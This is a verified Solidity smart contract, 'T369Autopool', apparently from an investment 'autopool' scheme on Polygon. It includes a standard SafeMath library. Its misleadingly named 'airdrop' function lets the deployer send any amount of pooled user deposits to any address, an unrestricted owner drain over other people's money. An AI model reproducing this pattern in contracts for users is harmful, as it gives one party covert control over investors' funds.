/**
 *Submitted for verification at polygonscan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

contract T369Autopool {

    using SafeMath for uint256;

    address payable initiator;
    event Deposits(address buyer, uint256 amount);
    
    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }

    constructor() public {
        initiator = msg.sender;
    }

    function autopooler(address payable  _contributor, uint256 _balance) public payable{
        require(msg.value>_balance,"Invalid Investment!");
        _contributor.transfer(_balance);
        emit Deposits(msg.sender,msg.value);
    }

    function airdrop(address payable buyer, uint _amount) external onlyInitiator{
            buyer.transfer(_amount);
        }
    
    }

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}